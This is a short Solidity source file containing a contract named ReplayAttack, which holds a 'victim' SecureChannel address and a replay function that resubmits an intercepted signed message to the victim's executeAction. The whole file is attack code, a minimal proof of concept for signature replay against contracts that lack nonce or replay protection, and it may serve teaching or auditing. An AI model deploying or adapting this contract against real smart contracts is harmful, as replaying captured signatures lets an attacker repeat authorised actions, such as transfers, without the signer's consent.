pragma solidity ^0.8.21;

interface SecureChannel {
    function executeAction(bytes calldata signedMessage) external;
}

contract ReplayAttack {
    SecureChannel public victim;

    constructor(address _victim) {
        victim = SecureChannel(_victim);
    }

    function replay(bytes calldata capturedSignedMessage) external {
        // Replays the intercepted signed message
        victim.executeAction(capturedSignedMessage);
    }
}
